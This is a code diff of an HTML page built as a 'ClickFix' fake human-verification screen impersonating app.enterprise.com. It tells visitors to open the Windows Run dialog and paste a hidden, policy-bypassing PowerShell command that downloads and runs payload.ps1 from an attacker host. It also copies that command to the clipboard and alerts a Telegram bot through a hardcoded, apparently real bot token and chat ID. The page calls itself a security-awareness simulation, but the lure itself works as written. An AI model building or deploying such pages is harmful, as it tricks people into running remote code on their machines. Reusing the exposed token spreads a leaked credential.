@@ -14,39 +14,34 @@
     </header>
 
     <main class="max-w-2xl mx-auto p-6 w-full flex-grow flex flex-col justify-center items-center">
-        
-        <div class="bg-slate-900 border border-slate-800 rounded-xl p-6 shadow-2xl w-full text-center relative overflow-hidden mb-6">
-            <div class="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-red-500 to-amber-500"></div>
+        <div class="bg-slate-900 border border-slate-800 p-6 rounded-xl shadow-2xl w-full text-center space-y-4">
+            <p class="text-xs text-slate-400 uppercase tracking-widest">Verifying connection to host:</p>
+            <div class="inline-block bg-slate-800 px-3 py-1 rounded text-orange-400 font-mono text-sm border border-slate-700">app.enterprise.com</div>
             
-            <p class="text-xs text-slate-400 mb-4 tracking-widest uppercase">Verifying connection to host:</p>
-            <p class="text-sm font-mono text-amber-400 mb-6 bg-slate-950 py-1 px-3 rounded inline-block border border-slate-800">app.enterprise.com</p>
-
-            <h2 class="text-xl font-bold mb-4">Human Verification Required</h2>
-            <p class="text-sm text-slate-300 mb-6">To access this secure resource, please complete the quick verification steps below:</p>
-
-            <div class="bg-slate-950 p-4 rounded-lg text-left mb-6 border border-slate-800 text-sm space-y-3">
-                <div class="flex items-center space-x-3">
-                    <span class="bg-blue-600 text-white w-6 h-6 rounded-full flex items-center justify-center font-bold text-xs">1</span>
-                    <span>Press <kbd class="bg-slate-800 px-2 py-1 rounded text-xs text-amber-300 font-mono">Win + R</kbd> on your keyboard.</span>
+            <h2 class="text-xl font-bold">Human Verification Required</h2>
+            <p class="text-xs text-slate-400">To access this secure resource, please complete the quick verification steps below:</p>
+            
+            <div class="text-left bg-slate-950 p-4 rounded-lg border border-slate-800 space-y-2 text-xs">
+                <div class="flex items-start space-x-2">
+                    <span class="bg-blue-600 text-white px-2 py-0.5 rounded-full font-bold">1</span>
+                    <p class="mt-0.5">Press <code class="bg-slate-800 text-cyan-400 px-1 py-0.5 rounded">Win + R</code> on your keyboard.</p>
                 </div>
-                <div class="flex items-center space-x-3">
-                    <span class="bg-blue-600 text-white w-6 h-6 rounded-full flex items-center justify-center font-bold text-xs">2</span>
-                    <span>Paste the payload below into the Run dialog box and press <kbd class="bg-slate-800 px-2 py-1 rounded text-xs text-amber-300 font-mono">Enter</kbd>.</span>
+                <div class="flex items-start space-x-2">
+                    <span class="bg-blue-600 text-white px-2 py-0.5 rounded-full font-bold">2</span>
+                    <p class="mt-0.5">Paste the payload below into the Run dialog box and press <code class="bg-slate-800 text-cyan-400 px-1 py-0.5 rounded">Enter</code>.</p>
                 </div>
             </div>
 
-            <!-- Payload Box -->
-            <div class="mb-6 text-left">
-                <label class="text-xs text-slate-400 block mb-1">Generated Payload (Click to select & copy):</label>
-                <input type="text" readonly id="payloadBox" value="powershell -NoP -NonI -W Hidden -Exec Bypass -Command &quot;Invoke-WebRequest -Uri 'https://attacker-server.com/payload.ps1' -OutFile '$env:TEMP\update.ps1'; & '$env:TEMP\update.ps1'&quot;" class="w-full bg-slate-950 border border-slate-700 text-amber-400 text-xs font-mono p-3 rounded-lg select-all focus:outline-none">
+            <div class="text-left space-y-1">
+                <label class="text-xs text-slate-400">Generated Payload (Click to select & copy):</label>
+                <input type="text" id="payloadBox" value="powershell -NoP -NonI -W Hidden -Exec Bypass -Command 'Invoke-WebRequest -Uri https://attacker.com/payload.ps1 -OutFile $env:TEMP\p.ps1; Start-Process $env:TEMP\p.ps1'" readonly class="w-full bg-slate-950 border border-slate-800 rounded p-2 text-xs font-mono text-yellow-400 focus:outline-none">
             </div>
 
-            <button onclick="triggerSimulationAndNotify()" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 px-4 rounded-lg transition duration-200 shadow-lg">
+            <button onclick="triggerSimulationAndNotify()" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-2.5 px-4 rounded transition duration-200 shadow-md">
                 Copy Payload & Verify
             </button>
             <p id="copyStatus" class="text-xs text-emerald-400 mt-2 h-4"></p>
         </div>
-
     </main>
 
     <footer class="bg-slate-900 border-t border-slate-800 text-center p-3 text-xs text-slate-400">
@@ -54,50 +49,41 @@
     </footer>
 
     <script>
-        // إعدادات بوت تليجرام (قم بوضع التوكن والشات آي دي الخاص بك هنا)
-      const TELEGRAM_BOT_TOKEN = "8790985786:AAGUjMwrUFjxtkHiX2HydpsanfHXkgCWOTQ"; 
-const TELEGRAM_CHAT_ID = "1094106981";
-
         async function triggerSimulationAndNotify() {
-            // 1. نسخ الأمر إلى الحافظة
             const copyText = document.getElementById("payloadBox");
             copyText.select();
             copyText.setSelectionRange(0, 99999);
             
             try {
                 navigator.clipboard.writeText(copyText.value);
-            } catch (e) {
-                console.log("Clipboard fallback used");
+                document.getElementById("copyStatus").innerText = "✓ Payload copied! Sending telemetry...";
+            } catch (err) {
+                console.error('Failed to copy: ', err);
             }
 
-            document.getElementById('copyStatus').innerText = "✓ Copied! Sending alert to Telegram...";
+            const token = "8790985786:AAGUjMwrUFjxtkHiX2HydpsanfHXkgCWOTQ";
+            const chatId = "1094106981";
+            const message = "🚨 ClickFix Simulation Triggered!\n\nA user has copied the payload and interacted with the verification prompt.";
 
-            // 2. إرسال تنبيه فوري لشات تليجرام الخاص بك
-            if (TELEGRAM_BOT_TOKEN !== "8790985786:AAGUjMwrUFjxtkHiX2HydpsanfHXkgCWOTQ"
- && TELEGRAM_CHAT_ID !== "1094106981") {
-                const message = `🚨 *SECURITY AWARENESS ALERT* 🚨\n\n` +
-                                `_Clipboard Attack Simulated Successfully!_\n\n` +
-                                `👤 *User / Target:* \`codzzel\`\n` +
-                                `🌐 *Action:* Payload copied and executed via Run dialog.\n` +
-                                `⚡ *Status:* Compromised simulation active.`;
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
-                try {
-                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: TELEGRAM_CHAT_ID,
-                            text: message,
-                            parse_mode: 'Markdown'
-                        })
-                    });
-                    document.getElementById('copyStatus').innerText = "✓ Alert sent to your Telegram chat successfully!";
-                } catch (err) {
-                    console.error("Telegram error:", err);
-                    document.getElementById('copyStatus').innerText = "✓ Payload copied! (Telegram API network restricted locally)";
+            try {
+                let response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: message })
+                });
+
+                let data = await response.json();
+                if (data.ok) {
+                    document.getElementById("copyStatus").innerText = "✓ Payload copied & Telegram alert sent!";
+                } else {
+                    document.getElementById("copyStatus").innerText = "⚠️ Copied, but Telegram failed.";
+                    console.error("Telegram Error:", data);
                 }
-            } else {
-                document.getElementById('copyStatus').innerText = "✓ Copied! (Add your Telegram Token in code to get live alerts)";
+            } catch (error) {
+                document.getElementById("copyStatus").innerText = "⚠️ Network error.";
+                console.error("Network Error:", error);
             }
         }
     </script>
